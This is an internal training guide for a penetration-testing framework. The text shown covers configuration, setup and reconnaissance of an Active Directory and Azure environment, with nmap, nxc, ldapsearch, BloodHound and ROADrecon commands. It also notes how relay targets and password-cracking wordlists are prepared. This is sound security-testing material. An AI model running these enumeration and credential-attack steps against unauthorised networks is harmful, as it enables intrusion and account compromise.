# HA-SHEM VAPT Framework — Operator Training Guide

**Classification:** INTERNAL — Security Team Use Only  
**Framework Version:** As-built (April 2026)  
**Target Audience:** Security engineers with basic penetration testing knowledge who will run engagements using this framework  

---

## Table of Contents

1. [What This Framework Does and Why](#1-what-this-framework-does-and-why)
2. [Architecture: How the Phases Chain Together](#2-architecture-how-the-phases-chain-together)
3. [Configuration Reference (config.env)](#3-configuration-reference-configenv)
4. [Phase 0 — Pre-Engagement Setup](#4-phase-0--pre-engagement-setup)
5. [Phase 1 — Reconnaissance and Discovery](#5-phase-1--reconnaissance-and-discovery)
6. [Phase 2 — Vulnerability Assessment](#6-phase-2--vulnerability-assessment)
7. [Phase 3 — Exploitation](#7-phase-3--exploitation)
8. [Phase 4 — Post-Exploitation](#8-phase-4--post-exploitation)
9. [Phase 5 — Consolidation and Reporting](#9-phase-5--consolidation-and-reporting)
10. [Data Flow Reference Table](#10-data-flow-reference-table)
11. [Finding Classification Guide](#11-finding-classification-guide)
12. [What Good Looks Like / What Bad Looks Like](#12-what-good-looks-like--what-bad-looks-like)
13. [Failure Modes and How to Diagnose Them](#13-failure-modes-and-how-to-diagnose-them)

---

## 1. What This Framework Does and Why

The Ha-Shem VAPT framework automates the repeatable, parallelisable, and time-consuming portions of an internal network penetration test so that the operator's time is spent on analysis, decision-making, and documentation rather than on typing commands.

What it does **not** automate: decisions. Every action that could cause harm — relay attacks, lateral movement hops, DCSync, password sprays — requires explicit operator confirmation at a checkpoint prompt before the framework proceeds. The automation handles the mechanical work; the operator handles the judgement calls.

### Why a structured phase model?

Penetration testing without structure produces two failure modes:

1. **Scope creep**: The operator discovers an interesting path and follows it without documenting the chain, losing the evidence needed to write findings.
2. **Missing findings**: Without a checklist, whole categories of vulnerabilities (AD CS, delegation, NTLM relay) get skipped because the operator is focused on what they already found.

The six-phase model enforces a logical sequence: you cannot exploit what you haven't enumerated, and you cannot enumerate what you haven't discovered. Each phase's outputs are the inputs for the next. If a file is missing, the downstream phase tells you exactly what failed and why.

### Scope of this framework

This framework covers a hybrid environment: an on-premises Active Directory domain (Windows) combined with Azure/Entra ID. It does not cover Linux privilege escalation, physical attacks, social engineering, or wireless — those require separate toolchains and are out of scope for this automation.

---

## 2. Architecture: How the Phases Chain Together

### Data flow diagram (ASCII)

```
Phase 0: Pre-Engagement Setup
│
│  Outputs: $OUTPUT_BASE_DIR/phase0/scope.json
│           BloodHound CE running at http://localhost:8080
│
▼
Phase 1: Reconnaissance & Discovery
│
│  Inputs:  config.env (TARGET_SUBNETS, DC_IP, DOMAIN_*)
│
│  Outputs consumed by Phase 2:
│    phase1/network/live_hosts_all.txt  ──► Phase 2 SMB vuln checks (mapfile array)
│    phase1/ad/userlist.txt             ──► Phase 2 AS-REP check (GetNPUsers -usersfile)
│    phase1/network/fullscan.gnmap      ──► Operator review only
│    phase1/ad/smb_sweep.txt            ──► Operator review only
│    phase1/ad/relay_target_ips.txt     ──► Phase 3 ntlmrelayx (-tf flag)
│    phase1/ad/bloodhound/*.zip         ──► BloodHound CE GUI import (manual)
│    phase1/cloud/roadrecon.db          ──► roadrecon gui (manual)
│
▼
Phase 2: Vulnerability Assessment
│
│  Inputs:  phase1/network/live_hosts_all.txt
│           phase1/ad/userlist.txt
│
│  Outputs consumed by Phase 3:
│    phase2/ad/ad_checks/kerberoastable_accounts.txt  ──► Confirms SPN targets
│    phase2/ad/ad_checks/asrep_accounts.txt           ──► Confirms no-preauth accounts
│    phase2/ad/ad_checks/password_policy.txt          ──► Spray safety check
│    phase2/network/smb_vuln_checks.txt               ──► Operator review only
│
▼
Phase 3: Exploitation
│
│  Inputs:  phase1/ad/relay_target_ips.txt
│           phase1/ad/userlist.txt
│           phase2/ad/ad_checks/kerberoastable_accounts.txt
│           phase2/ad/ad_checks/asrep_accounts.txt
│           Responder captures: /usr/share/responder/logs/SMB-NTLMv2-*.txt
│
│  Outputs consumed by Phase 4:
│    phase3/ad/pth_accessible_hosts.txt  ──► SAM sweep target list
│    phase3/ad/kerberoast_tickets.txt    ──► Raw TGS hashes (Hashcat input)
│    phase3/ad/asrep_hashes.txt          ──► Raw AS-REP hashes (Hashcat input)
│    phase3/ad/cracked_tgs.txt           ──► Cracked Kerberoast passwords
│    phase3/ad/cracked_ntlm.txt          ──► Cracked NTLMv2 passwords
│    phase3/ad/cracked_asrep.txt         ──► Cracked AS-REP passwords
│    phase3/ad/relay_loot/              ──► SAM dumps from relay
│
▼
Phase 4: Post-Exploitation
│
│  Inputs:  phase3/ad/pth_accessible_hosts.txt
│           phase3/ad/cracked_*.txt
│
│  Outputs consumed by Phase 5:
│    phase4/blast_radius/blast_radius.md          ──► Attack chain hop log
│    phase4/blast_radius/blast_radius_summary.md  ──► Full summary
│    phase4/ad/hop*.txt                           ──► Per-hop evidence
│    phase4/ad/dcsync_poc.txt                     ──► DCSync evidence
│    phase4/cloud/azure_blast.txt                 ──► Azure blast radius
│
▼
Phase 5: Consolidation & Reporting
│
│  Inputs:  All phase outputs above
│
│  Outputs:
│    report/evidence/           ──► Organised by category
│    report/TECHNICAL_REPORT_SCAFFOLD.md  ──► Pre-filled with counts
│    report/evidence_manifest.sha256      ──► SHA-256 of all evidence files
```

### The dependency map

The critical chain is: **live hosts → userlist → kerberoastable/asrep targets → hashes → cracked passwords → PtH hosts → SAM dumps → DCSync capability**.

Break any link and the downstream phases degrade gracefully — they log what's missing and skip, rather than crashing. But the operator must understand what was skipped and why, because a skipped step is a missing finding, not a negative result.

---

## 3. Configuration Reference (config.env)

The configuration file is `config.env` in the project root (never committed to git; copy from `config.env.example`). Every variable here has a downstream effect. Understanding each one is mandatory.

### Engagement metadata

```
ENGAGEMENT_NAME="HaShem-VAPT-2026"   # Appears in scope.json and report scaffold
ENGAGEMENT_DATE="2026-04-01"          # Engagement start date
OUTPUT_BASE_DIR="${HOME}/vapt"         # All evidence lands here; must be on a fast local drive
```

`OUTPUT_BASE_DIR` is the root of the entire evidence tree. Every phase creates subdirectories here. If this path is on a network drive or encrypted volume that unmounts mid-scan, background jobs fail silently and produce empty output files. Use local SSD.

### Network scope

```
TARGET_SUBNETS="10.10.0.0/24 10.10.1.0/24 192.168.1.0/24"
ATTACKER_INTERFACE="eth0"
ATTACKER_IP="10.10.0.50"
```

`TARGET_SUBNETS` is space-separated. Every nmap sweep and CME sweep iterates over every entry. If you add a subnet mid-engagement, re-run Phase 1 with `--only host_sweep,smb_sweep` to pick up new hosts without re-running everything.

`ATTACKER_INTERFACE` must be the interface physically connected to the target network, not a loopback or VPN tunnel interface. Responder binds to this interface. Getting this wrong means Responder sees no traffic.

### Active Directory

```
DOMAIN_NAME="hashem.local"
DC_IP="10.10.1.10 10.10.1.11"
```

`DC_IP` is the most critical variable in the file. It is space-separated. The first IP becomes `PRIMARY_DC` — used for all single-target tool flags (`-dc-ip`, `-ns`, `ldap://`). **All** IPs in the list are independently tested for reachability, null session, and LDAP banner in Phase 1.

Why check all DCs? In a multi-DC environment, security misconfigurations are often inconsistently applied. One DC may have been patched or hardened while another was forgotten. Checking only one DC gives a false sense of the domain's security posture.

### Scan timing

```
NMAP_TIMING="3"           # T3 = normal; use T2 for stealth
NMAP_MAX_RATE="500"       # packets/sec cap for host sweep
NMAP_DISCOVERY_PORTS="88,135,139,443,3389,5985,8080,8443"
NMAP_FULLSCAN_PORTS="88,135,139,443,3389,5985,8080,8443"
SCAN_EXCLUDE_RANGES=""    # Space-separated IPs/CIDRs to exclude from all scans
```

`NMAP_DISCOVERY_PORTS` is a deliberate Windows-only set. These eight ports appear on Windows workstations and servers but not on routers, switches, printers, or IPMI cards:

- **88**: Kerberos — only on domain controllers
- **135**: Microsoft RPC endpoint mapper — all Windows hosts
- **139**: NetBIOS Session Service — all Windows hosts
- **443**: HTTPS — Windows web services (IIS, Exchange, SharePoint)
- **3389**: RDP — all managed Windows desktops and servers
- **5985**: WinRM (Windows Remote Management) — all managed Windows
- **8080/8443**: Web application ports — Windows intranet apps

Ports 22 (SSH) and 80 (HTTP) are intentionally excluded. SSH is common on Linux infrastructure (switches, NAS devices, cameras) that you don't want in your Windows host list. Plain HTTP on port 80 is on every printer, router, and UPS in the building. Including these ports floods your live host list with infrastructure noise that will generate false positives in every downstream step.

`SCAN_EXCLUDE_RANGES` should contain default gateways (`.1`, `.254`), monitoring infrastructure, OOB management interfaces, and printer subnets. These devices will respond to TCP SYN probes on port 443 or 3389 but are not Windows hosts.

### Password spray controls

```
SPRAY_ENABLED="false"          # Off by default — must be explicitly enabled
SPRAY_MAX_ATTEMPTS="2"         # MUST be below lockout threshold
SPRAY_DELAY_SECONDS="1800"     # 30-minute delay between attempts (anti-lockout)
```

Spray is off by default because it carries account lockout risk. `SPRAY_MAX_ATTEMPTS` is validated against `phase2/ad/ad_checks/password_policy.txt` before execution. If the lockout threshold is 5, `MAX_ATTEMPTS` of 2 means you use 2 of the 5 attempts, leaving a 3-attempt safety margin. The framework will abort the spray if `MAX_ATTEMPTS >= lockout_threshold`.

### ZAP DAST

```
WEB_TARGETS="http://intranet.hashem.local https://portal.hashem.local"
ZAP_SCAN_MODE="baseline"   # baseline = passive; full = active (sends attack payloads)
ZAP_CONCURRENCY="4"        # Max concurrent ZAP Docker containers
```

`ZAP_SCAN_MODE="baseline"` is the safe default. It crawls the application and reports on passive observations (missing headers, information disclosure, insecure cookies) without sending attack payloads. Use `full` only when the RoE explicitly covers active web testing and the application owners have been notified.

`ZAP_CONCURRENCY` prevents the attacker machine from running 20 Docker containers simultaneously against 20 web targets. Default 4 is appropriate for a 4-vCPU box. Each ZAP container consumes approximately 512MB RAM and one vCPU during an active scan.

### Operational constraints

```
TESTING_WINDOW_START="09:00"
TESTING_WINDOW_END="17:00"
ENFORCE_TESTING_WINDOW="true"
EMERGENCY_CONTACT="Management Sponsor — Elizabeth A."
```

`ENFORCE_TESTING_WINDOW` gates every phase at startup. If it is 08:45 and you run Phase 1, the script exits immediately with a reminder of the allowed window. This prevents accidental out-of-hours scanning.

Responder is specifically excluded from this check because it is already running when the window starts — the issue is stopping it. The framework schedules an automatic `pkill` via `atd` at `TESTING_WINDOW_END`. If `atd` is not running, the framework warns the operator and displays the manual kill command prominently.

---

## 4. Phase 0 — Pre-Engagement Setup

**Script:** `phases/phase0_setup.sh`  
**Orchestrator:** `python3 orchestrator.py --phase 0`  
**Duration:** 5–30 minutes (mostly tool installation if tools are missing)

### Purpose

Phase 0 answers the question: "Is this machine ready to run the engagement?" before the testing window opens, not during it. Tool installation, configuration validation, and BloodHound startup happen here so that Phase 1 starts immediately when the engagement begins.

### What gets automated

**1. pipx bootstrap**

All Python pentest tools (bloodhound-python, roadrecon, certipy-ad, impacket) are installed via `pipx`. `pipx` gives each tool its own isolated virtual environment and exposes the binary on `$PATH` without requiring `venv` activation. This avoids the PEP 668 "externally managed environment" error on modern Kali and prevents one tool's dependency requirements from conflicting with another's.

**2. Docker CE installation and configuration**

The framework needs Docker for two purposes: BloodHound CE (via bloodhound-cli) and OWASP ZAP DAST scans. Phase 0 installs Docker CE from the upstream `download.docker.com/linux/debian` repository, not from `docker.io`. The distinction matters: `docker.io` is the community-maintained Debian/Ubuntu package that lags behind upstream by months and often lacks the `compose` plugin.

Phase 0 also writes `/etc/docker/daemon.json` with `{"ipv6": false}`. On pentest boxes and VMs that lack IPv6 internet routing, Docker's default behaviour is to try IPv6 for registry pulls (resolving AAAA records first), fail after six attempts, and only then fall back to IPv4. Setting `"ipv6": false` forces all Docker image pulls to use IPv4 from the start. Without this, `docker pull` hangs for minutes on a VPN-connected attacker box.

**3. Directory structure creation**

```
$OUTPUT_BASE_DIR/
├── phase0/{network,ad,web,cloud,misc}
├── phase1/{network,ad,web,cloud,misc}
├── phase2/{network,ad,web,cloud,misc}
├── phase3/{network,ad,web,cloud,misc}
├── phase4/{network,ad,web,cloud,misc}
├── phase5/{network,ad,web,cloud,misc}
├── tools/
└── report/
    └── evidence/
```

Creating this structure before the engagement starts means every phase script can assume its output directories exist. No phase needs to create its own directories.

**4. Tool verification**

Required tools: `nmap`, `nxc`/`crackmapexec`, `responder`, `hashcat`, `bloodhound-python`, `roadrecon`, `az`, `docker`, `ldapsearch`

Optional tools: `impacket-GetUserSPNs`, `impacket-GetNPUsers`, `impacket-ntlmrelayx`, `impacket-secretsdump`, `impacket-psexec`, `certipy-ad`, `msfconsole`

Missing required tools trigger auto-install prompts. The framework installs nxc (NetExec, the maintained successor to CrackMapExec) preferentially over crackmapexec. Azure CLI is installed via Microsoft's official install script (`aka.ms/InstallAzureCLIDeb`) rather than the Kali apt repo, which lags behind.

**5. BloodHound CE startup via bloodhound-cli**

`bloodhound-cli` is SpecterOps' official management tool for BloodHound Community Edition. It wraps Docker Compose internally and handles the container orchestration without requiring the operator to manage a docker-compose.yml file. The framework downloads `bloodhound-cli` from GitHub releases if not found, then runs:

```
bloodhound-cli install --no-prompt   # idempotent — safe to run repeatedly
bloodhound-cli start
```

After starting, the framework polls `http://localhost:8080/api/version` every 5 seconds for up to 180 seconds. BloodHound CE is ready when this endpoint responds. The admin password is retrieved with `bloodhound-cli password`.

**Why bloodhound-cli instead of manual docker-compose?** The manual docker-compose approach had a known bug where Neo4j's IPv6 dual-stack routing table configuration caused connection failures on hosts without IPv6 internet access. bloodhound-cli handles this internally.

**6. Azure CLI login check**

The framework calls `az account show` to detect whether the operator is already authenticated. If not, it offers to run `az login --tenant $AZURE_TENANT_ID --use-device-code`. The device code flow is used because it works on any tenant regardless of Conditional Access policies, MFA enforcement, or security defaults.

**7. DC reachability pre-check**

Pings all DCs in `DC_IP`. A failed ping does not abort — DCs may have ICMP blocked at the firewall. The check is informational; Phase 1 nmap will confirm reachability regardless.

**8. Scope file creation**

Writes `$OUTPUT_BASE_DIR/phase0/scope.json`:

```json
{
  "generated": "2026-04-28T09:00:00Z",
  "engagement": "HaShem-VAPT-2026",
  "domain": "hashem.local",
  "dc_ip": "10.10.1.10 10.10.1.11",
  "subnets": "10.10.0.0/24 10.10.1.0/24",
  "azure_tenant": "xxxxxxxx-...",
  "attacker_ip": "10.10.0.50"
}
```

This file is an engagement metadata record, not used by downstream scripts programmatically. It answers "what were the parameters for this engagement?" when reviewing evidence months later.

### Key decisions and their rationale

**Why verify tools before the engagement window opens?** Tool installation downloads packages and may require a reboot (Docker daemon start, newgrp for docker group membership). Running this during the 09:00–17:00 window wastes billable testing time. Phase 0 runs the day before, or first thing in the morning before the window opens.

**Why corporate wordlist generation in Phase 0?** The corporate pattern wordlist (`$OUTPUT_BASE_DIR/tools/corporate_patterns.txt`) is generated from organisation-specific words (the domain name, known org abbreviations) combined with year patterns and common suffixes. Generating it in Phase 0 means it exists when hashcat runs in Phase 3. A corporate-pattern wordlist like `Hashem2025!` or `HaShem@2024` catches passwords that rockyou.txt will never crack.

### What to validate before moving on

Before starting Phase 1, verify:

1. `bloodhound-cli status` shows all containers healthy
2. `http://localhost:8080` loads the BloodHound CE UI in the browser
3. `az account show` returns the correct tenant and user
4. `nxc --version` or `crackmapexec --version` returns successfully
5. `$OUTPUT_BASE_DIR/phase0/scope.json` exists and contains correct values
6. `$OUTPUT_BASE_DIR/tools/corporate_patterns.txt` exists and has entries
7. All required tools show as found in the Phase 0 output log

### Manual items still required

Phase 0 automation cannot replace:

- **Signed Rules of Engagement from all six parties**: Testing without signed RoE is unauthorised access. Do not start Phase 1 until this is in hand.
- **Asset inventory from Networking and Cloud Platform teams**: The IP ranges in `TARGET_SUBNETS` must be confirmed as in-scope. A CIDR that includes out-of-scope assets generates findings against systems you have no right to test.
- **Testing window confirmed with management sponsors**: The `TESTING_WINDOW_START/END` values must match what was agreed in the RoE.
- **Emergency stop contact confirmed**: `EMERGENCY_CONTACT` in config.env must be a reachable person who can stop the test if something goes wrong.

---

## 5. Phase 1 — Reconnaissance and Discovery

**Script:** `phases/phase1_discovery.sh`  
**Orchestrator:** `python3 orchestrator.py --phase 1`  
**Duration:** 2–8 hours depending on network size (most steps run in background)

### Purpose

Phase 1 answers: "Who is on the network, what services are they running, and what does the Active Directory environment look like?" This phase is pure enumeration — no exploitation, no credential attacks. Everything collected here becomes the target list for Phases 2 and 3.

---

### Step 1.1 — TCP SYN Host Sweep

**What it does:** Sends TCP SYN packets to the eight Windows-signature ports across every CIDR in `TARGET_SUBNETS`. Records which hosts respond with SYN-ACK (port open) or RST (port closed but host up — note: with `--open`, only open ports are counted as live).

**Command (per subnet):**
```bash
nmap -sS --open \
     -p 88,135,139,443,3389,5985,8080,8443 \
     -T3 --max-rate 500 \
     --min-parallelism 40 --max-parallelism 200 \
     --max-retries 1 \
     --initial-rtt-timeout 100ms \
     --max-rtt-timeout 300ms \
     --host-timeout 10s \
     -oA $OUTPUT_BASE_DIR/phase1/network/hostsweep_10.10.0.0_24 \
     10.10.0.0/24
```

**Why `-sS` (TCP SYN) instead of `-sn` (ping sweep)?**

`-sn` uses ICMP echo requests, ICMP timestamp requests, and TCP SYN/ACK probes to ports 80 and 443. Every router, switch, printer, UPS, IPMI card, and network management device responds to ICMP. In a typical enterprise environment, running `-sn` against a /24 returns 50–80 "live" hosts where only 20 are actually Windows machines — the rest are printers, managed switches, and out-of-band management interfaces.

`-sS --open` with Windows-specific ports produces a fundamentally different result: only hosts with at least one open port from the Windows set are counted as live. A printer with ICMP but no SMB/RDP/WinRM will not appear. This makes the live host list usable directly as nmap and CME scan input without manual filtering.

**Why the RTT limits?**

`--initial-rtt-timeout 100ms` and `--max-rtt-timeout 300ms` mean that any host that takes more than 300ms to respond to a SYN probe is dropped. Windows hosts with open SMB/RDP respond in <5ms on a switched LAN. Managed switches with ACLs, printers with TCP stacks, and IPMI cards often respond slowly (200–800ms) because their TCP stacks are implemented in firmware. The RTT limits drop slow-responding devices before they pollute the live host list.

**Outputs:**
- `phase1/network/hostsweep_<subnet>.gnmap` (one per subnet)
- `phase1/network/hostsweep_<subnet>.nmap` (human-readable)
- `phase1/network/hostsweep_<subnet>.xml` (machine-readable)
- `phase1/network/live_hosts_all.txt` — merged deduplicated IP list (all subnets)

**What to look for:**

`live_hosts_all.txt` is your primary deliverable from this step. Count the hosts. Does the number match what you expected from the asset inventory? If you expected 150 Windows hosts and got 220, the extra 70 need to be identified — either the asset inventory is incomplete (common) or there are unauthorised devices on the network (less common but significant finding).

---

### Step 1.2 — Full Port Scan (Two-Phase)

**What it does:** Takes `live_hosts_all.txt` as input and performs detailed service detection against all confirmed live hosts. Runs in two sub-phases to maximise reliability.

**Phase A — Port confirmation (fast):**
```bash
nmap -sS --open \
     -p 88,135,139,443,3389,5985,8080,8443 \
     -T4 --max-rate 1000 --max-retries 2 \
     --host-timeout 60s \
     -iL live_hosts_all.txt \
     -oA phase1/network/fullscan_portsonly
```

Phase A quickly re-confirms which ports are open on the live host list. The 60-second host timeout is safe because `-sS` without version detection completes in single-digit seconds per host. The output (`fullscan_portsonly.gnmap`) identifies which hosts have confirmed-open ports.

**Phase B — Service/version detection (thorough):**
```bash
nmap -sS -sV \
     --version-intensity 5 \
     -p 88,135,139,443,3389,5985,8080,8443 \
     -T3 --max-rate 1000 --max-retries 2 \
     --host-timeout 300s \
     -iL live_hosts_all.txt \
     -oA phase1/network/fullscan
```

Phase B runs against the **original live hosts list** (not just Phase A's confirmed-open results). This is critical: some hosts have all ports filtered (drop rather than reject) — they appear in Phase A with zero confirmed-open ports but are still live Windows hosts. Running Phase B against the full list means these firewalled-but-reachable hosts appear in `fullscan.gnmap` with `filtered` state annotations. The operator needs to see filtered vs closed vs open for every live host.

**Why no `-sC` (NSE scripts)?**

NSE scripts (the `-sC` flag) run Nmap's scripting engine against every service detected. In a bulk scan context, they are slow (adding 5–60 seconds per host per service), noisy (generating multiple connection attempts per port), and inconsistent (script results vary by service version in ways that create false positive and false negative findings). NSE scripts belong in targeted follow-up scans against specific services on specific hosts — for example, `nmap -p 445 --script smb-vuln-ms17-010 10.10.1.5` as a follow-up after the vuln module check in Phase 2 flags a host.

**Why 300-second host timeout for Phase B?**

`-sV` (service/version detection) sends multiple probes per open port, then waits for service banners. For a host with five open ports, each getting 5–10 probes with network round-trip time, the per-host budget can easily reach 60–120 seconds. The previous default of 30 seconds caused most hosts to be aborted mid-scan, producing empty gnmap output. 300 seconds provides enough budget for `-sV` to complete on all ports for all live hosts.

**Outputs:**
- `phase1/network/fullscan.gnmap` — the primary evidence file
- `phase1/network/fullscan.nmap` — human-readable version
- `phase1/network/fullscan_portsonly.gnmap` — Phase A port confirmation

**What to look for:**

Open `fullscan.gnmap` and look for:
- Unexpected services (port 443 open on hosts that shouldn't be running HTTPS — could be an admin web UI for a device)
- Service version banners — old IIS versions, old Kerberos implementations
- Hosts where all ports are `filtered` — these may be important servers behind host-based firewalls that deserve targeted investigation
- Hosts where only port 88 is open — almost certainly a DC

---

### Step 1.3 — CME SMB Sweep and Signing Check

**What it does:** Runs `nxc smb` against every subnet, authenticating with domain credentials, to enumerate host details and check SMB signing status.

**Command (per subnet):**
```bash
nxc smb 10.10.0.0/24 -u DOMAIN_USER -p DOMAIN_PASS -d hashem.local
```

**Why CME after nmap?**

nmap tells you a port is open. CME tells you everything about the Windows host behind that port: OS version, hostname, domain membership, SMB dialect version, whether SMB signing is required, and whether the credentials succeed. The combination of nmap's port state and CME's host details gives you a complete picture.

**The SMB signing check — why it matters so much:**

CME's output for each host includes `signing:True` or `signing:False`. Hosts with `signing:False` means the server does not require SMB message signing — it will accept unsigned SMB sessions. This is the prerequisite for NTLM relay attacks in Phase 3.

The framework automatically extracts all `signing:False` hosts and writes their IPs to `phase1/ad/relay_target_ips.txt`. This file is the direct input for `ntlmrelayx` in Phase 3. Without this file, relay attacks cannot be launched.

**Why is SMB signing disabled on workstations by default?**

Microsoft's default Group Policy for workstations does not require SMB signing (it only enables it as an option). Domain Controllers have SMB signing required by default. This means that in most environments, every workstation is a valid relay target. This is a widespread misconfiguration class affecting the majority of Active Directory environments.

**Outputs:**
- `phase1/ad/smb_sweep.txt` — full CME output for all subnets
- `phase1/ad/relay_targets.txt` — full CME lines for signing:False hosts
- `phase1/ad/relay_target_ips.txt` — IP-only list for ntlmrelayx

**What to look for:**

- Count of `signing:False` hosts: anything above zero is a relay finding
- Host count versus nmap count: if CME finds fewer hosts than nmap, some hosts rejected the SMB authentication (different subnet, different domain, firewall drop on auth)
- OS versions: very old OS versions (Windows 7, Server 2003/2008 without ESU) are high-value targets
- Hosts where the credentials succeed (`+` in output) versus fail (`-`): failures may indicate hosts in a different domain

---

### Step 1.4 — LDAP DC Banner Grab

**What it does:** Runs `nmap -p 389 --script ldap-rootdse` against all DCs to grab the LDAP root DSE (Directory Service Agent-Specific Entry). The rootDSE contains the AD forest/domain names, functional levels, server capabilities, and configuration context paths.

**Why all DCs, not just PRIMARY_DC?**

The rootDSE banner can reveal different information per DC — particularly the `serverName` attribute which identifies the specific DC, and the `supportedSASLMechanisms` which shows what authentication methods are supported. A DC that supports deprecated mechanisms (like NTLM without channel binding) is a finding in its own right.

**Output:** `phase1/ad/ldap_rootdse.txt`

**What to look for:**

- `domainFunctionality` / `forestFunctionality`: values 0–4 indicate legacy functional levels (Server 2003 through 2008 R2). These indicate the domain has been running a long time without major restructuring.
- `supportedCapabilities`: the presence of LDAP_CAP_ACTIVE_DIRECTORY_LDAP_INTEG_OID indicates LDAP signing/channel binding is supported. Its absence suggests it may not be enforced.

---

### Step 1.5 — LDAP User Enumeration

**What it does:** Queries the domain's LDAP directory for all user objects, extracts `sAMAccountName`, and builds a clean username list.

**Command:**
```bash
ldapsearch -H ldap://10.10.1.10 \
    -D "DOMAIN_USER@hashem.local" \
    -w DOMAIN_PASS \
    -b "DC=hashem,DC=local" \
    '(objectClass=user)' sAMAccountName mail memberOf userAccountControl
```

**Why `ldapsearch` instead of CME's `--users` flag?**

CME's `--users` flag works but does not always return the full attribute set. `ldapsearch` with explicit attribute selection returns `sAMAccountName`, `mail`, `memberOf`, and `userAccountControl` in a single query. The `userAccountControl` attribute is the bitmask that tells you everything about an account's state — disabled, locked, password-never-expires, no-preauth-required, unconstrained delegation. This raw data is needed for Phase 2's AD checks.

**Why only query PRIMARY_DC?**

All domain controllers in an AD domain replicate the same directory partition. Querying `dc01.hashem.local` returns the same user objects as querying `dc02.hashem.local` — there is no benefit to querying multiple DCs for user enumeration. The primary DC is used for all LDAP queries to avoid load spreading across DCs (unnecessary in a pentest context).

**Outputs:**
- `phase1/ad/ldap_users.txt` — full ldapsearch output with all attributes
- `phase1/ad/userlist.txt` — clean sAMAccountName list (one username per line)

**Downstream consumers of userlist.txt:**
- Phase 2: `GetNPUsers -usersfile userlist.txt` (AS-REP check)
- Phase 3: `GetNPUsers -usersfile userlist.txt` (AS-REP roasting)
- Phase 1 (optional): CME spray `-u userlist.txt` (password spray)

**What to look for:**

- Total user count — document this for the report
- Account naming patterns — `svc_`, `sa_`, `_svc` naming suggests service accounts, which are Kerberoasting targets
- Machine accounts ending in `$` — these should be filtered out of the userlist (done automatically by the framework's grep filter)

---

### Step 1.6 — SMB Null Session Check

**What it does:** Attempts an anonymous SMB session against all DCs using empty username and password.

**Command:**
```bash
nxc smb 10.10.1.10 -u '' -p ''
```

**Why `-u '' -p ''` and not `--null-session`?**

`--null-session` is not a valid nxc flag. The correct way to test for null session vulnerability with nxc is to provide empty string credentials. The framework tests this against every DC independently.

**What a null session proves:**

A null session allows unauthenticated SMB connections to the DC. In older Windows environments (Server 2003 era defaults), a null session could enumerate users, groups, shares, and password policies without any credentials. Modern Windows Server defaults block null sessions, but the check is still valuable because:

1. Legacy DCs that were upgraded (not freshly installed) may retain older security settings
2. GPO drift — the setting that blocks null sessions (`Network access: Restrict anonymous access to Named Pipes and Shares`) may have been disabled for a legacy application
3. Some network appliances that impersonate Windows file servers still accept null sessions

**Finding if null session succeeds:**

This is an unauthenticated information disclosure finding. Even if you only get the DC's hostname and OS version, it proves the null session policy is misconfigured. Document it.

**Output:** `phase1/ad/nullsession_check.txt`

---

### Step 1.7 — BloodHound Data Collection

**What it does:** Runs `bloodhound-python` with `-c All` to collect all available BloodHound data collectors from the domain and produce a ZIP file of JSON data.

**Command:**
```bash
bloodhound-python \
    -u DOMAIN_USER -p DOMAIN_PASS \
    -d hashem.local -ns 10.10.1.10 \
    -c All --zip -w 20 \
    -o phase1/ad/bloodhound/
```

**What `-c All` collects:**

- **ACLs** (Access Control Lists): which principals have which permissions on which objects — the foundation of all BloodHound attack path analysis
- **Group Policy**: GPO links and their settings, relevant for finding policy gaps
- **Sessions**: which users are currently logged in to which computers — shows where high-value accounts are present
- **Trusts**: domain trust relationships — inter-domain attack paths
- **ObjectProperties**: attributes of all AD objects
- **Container**: OU structure — important for finding OUs where GPO inheritance is blocked

**Why `-w 20` workers?**

`-w 20` parallelises the LDAP queries. BloodHound data collection involves thousands of LDAP requests (one per object for ACL resolution, one per computer for session enumeration). With a single worker, this takes hours on a large domain. With 20 workers, the same collection takes 15–30 minutes. The DC can handle 20 parallel LDAP connections without performance impact in most environments.

**Why BloodHound matters above all other tools:**

BloodHound reveals attack paths that are invisible to any other tool. Consider this real-world path: "User jsmith has `GenericWrite` on Group 'IT Support'. The group has local administrator rights on WORKSTATION-42. WORKSTATION-42 has a Kerberoastable service account `svc_backup` logged in." No other tool in this framework can surface this chain. BloodHound graphs the entire permission model of the domain and finds paths that span dozens of intermediate steps.

**Output:** `phase1/ad/bloodhound/*.zip`

**Manual work required after collection:**

1. Open BloodHound CE at `http://localhost:8080`
2. Go to Administration → File Ingest
3. Upload the ZIP file
4. Run the following queries at minimum:
   - "Find all Domain Admins"
   - "Shortest Paths to Domain Admins"
   - "Find Principals with DCSync Rights"
   - "Find Computers with Unconstrained Delegation"
   - "Find all Kerberoastable Users"
   - "Users with Foreign Domain Group Membership"
5. Screenshot any attack paths with 5 or fewer hops from a standard user to a privileged account

---

### Step 1.8 — ROADrecon Entra ID Gather

**What it does:** Pulls the complete Entra ID (Azure AD) directory into a local SQLite database for offline analysis.

**Command (password auth mode):**
```bash
roadrecon gather -u DOMAIN_USER@hashem.local -p DOMAIN_PASS --database roadrecon.db
```

**Command (device code auth — required for MFA-protected tenants):**
```bash
roadrecon gather --device-code --database roadrecon.db
```

**What ROADrecon collects:**

- All users, groups, and their memberships
- All applications registered in the tenant
- All service principals and their credentials (client secrets, certificates)
- All role assignments (who has what Azure AD role)
- Conditional Access policies (who is covered, who is excluded)

**Manual analysis:**

```bash
roadrecon analyze    # builds the analytical views in the DB
roadrecon gui        # starts a local web UI at http://localhost:5000
```

**What to look for in ROADrecon GUI:**

- Users with Global Administrator role — count them and identify any non-human accounts (service principals with Global Admin is a critical finding)
- Applications with Application permissions (not delegated) to Microsoft Graph — these can read all mail, read all calendars, etc. without user consent
- Service principals with credentials — any service principal that has a secret or certificate can authenticate to the tenant and has whatever permissions are assigned to it
- Conditional Access policy gaps — are there admin accounts excluded from MFA policies? Users excluded from Conditional Access?

**Output:** `phase1/cloud/roadrecon.db`

---

### Step 1.9 — Azure Resource Inventory

**What it does:** Enumerates all Azure resources across all configured subscriptions using the Azure CLI.

**Outputs:** (all in `phase1/cloud/`)
- `azure_inventory.json` — merged resource list across all subscriptions
- `vms.txt` — virtual machine list
- `storage.txt` — storage account list
- `nsgs.txt` — network security groups
- `keyvaults.txt` — key vault list
- `sql_servers.txt` — SQL server list
- `public_ips.txt` — public IP addresses
- `entra_users.txt`, `entra_groups.txt`, `entra_apps.txt`, `entra_sps.txt`
- `role_assignments.txt` — all role assignments across subscription

**What to look for:**

- VMs with public IPs attached — these are internet-exposed and warrant separate external testing
- Key vaults — identify who has access to each vault; secrets stored in key vaults are high-value targets
- Storage accounts — publicly accessible blobs are critical findings (checked in Phase 2 and Phase 3)
